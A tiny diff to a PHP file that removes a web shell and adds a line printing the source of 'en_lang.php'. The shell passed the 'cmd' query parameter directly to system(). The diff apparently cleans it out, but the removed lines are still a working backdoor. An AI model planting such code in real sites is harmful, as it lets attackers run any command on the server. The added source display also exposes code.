@@ -1,12 +1,5 @@
 <?php
-$cmd = null;
 
-if(isset($_GET["cmd"])){
-
-$cmd = $_GET["cmd"];
-
-system($cmd);
-
-}
+echo show_source("en_lang.php");
 
 ?>
